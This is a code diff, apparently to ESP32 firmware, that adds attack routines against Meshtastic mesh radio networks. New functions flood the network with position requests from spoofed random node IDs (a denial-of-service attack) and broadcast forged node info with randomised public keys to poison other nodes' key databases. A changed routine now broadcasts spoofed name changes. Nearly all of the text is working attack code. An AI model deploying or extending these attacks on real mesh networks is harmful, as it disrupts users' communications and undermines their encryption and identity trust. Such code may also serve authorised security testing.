@@ -36,7 +36,7 @@ void TMAttack::atkRndPos() {
     pos_msg.has_longitude_i = true;
     pos_msg.has_altitude = true;
     pos_msg.has_ground_speed = true;
-    uint32_t srcnode = target;   // todo randomize based on node db
+    uint32_t srcnode = target;
     if (target == 0xffffffff) {  // if target is everybody, randomize srcnode
         srcnode = getRandomTarget();
         if (srcnode == 0) {
@@ -47,8 +47,7 @@ void TMAttack::atkRndPos() {
 }
 
 void TMAttack::atkNameChange() {
-    // Generate random latitude and longitude within specified bounds
-    uint32_t srcnode = target;   // todo randomize based on node db
+    uint32_t srcnode = target;
     if (target == 0xffffffff) {  // if target is everybody, randomize srcnode
         srcnode = getRandomTarget();
         if (srcnode == 0) {
@@ -72,6 +71,38 @@ void TMAttack::atkNameChange() {
     new_name += emoji;
     strncpy(node->long_name, new_name.c_str(), 39);
     node->long_name[39] = '\0';
+    meshtasticCompact->SendNodeInfo(*node, 0xffffffff, false);
+}
+
+void TMAttack::atkDdos() {
+    uint32_t srcnode = esp_random();
+    meshtasticCompact->SendRequestPositionInfo(0xffffffff, 8, srcnode);
+    srcnode = getRandomTarget();
+    if (srcnode == 0) {
+        return;  // no valid target found
+    }
+    MC_NodeInfo* node = meshtasticCompact->nodeinfo_db.get(srcnode);
+    if (!node) {
+        return;  // no valid target found
+    }
+    meshtasticCompact->SendNodeInfo(*node, 0xffffffff, true);
+}
+
+void TMAttack::atkPkiPoison() {
+    uint32_t srcnode = target;
+    if (target == 0xffffffff) {  // if target is everybody, randomize srcnode
+        srcnode = getRandomTarget();
+        if (srcnode == 0) {
+            return;  // no valid target found
+        }
+    }
+    auto node = meshtasticCompact->nodeinfo_db.get(srcnode);
+    if (!node) {
+        return;  // no valid target found
+    }
+    for (int i = 0; i < 32; i++) {
+        node->public_key[i] = esp_random() & 0xff;
+    }
     meshtasticCompact->SendNodeInfo(*node, 0xffffffff, false);
 }
 
@@ -121,5 +152,9 @@ void TMAttack::loop() {
         atkRndNode();
     } else if (current_attack == AttackType::NAME_CHANGE) {
         atkNameChange();
+    } else if (current_attack == AttackType::PKI_POISON) {
+        atkPkiPoison();
+    } else if (current_attack == AttackType::DDOS) {
+        atkDdos();
     }
 }
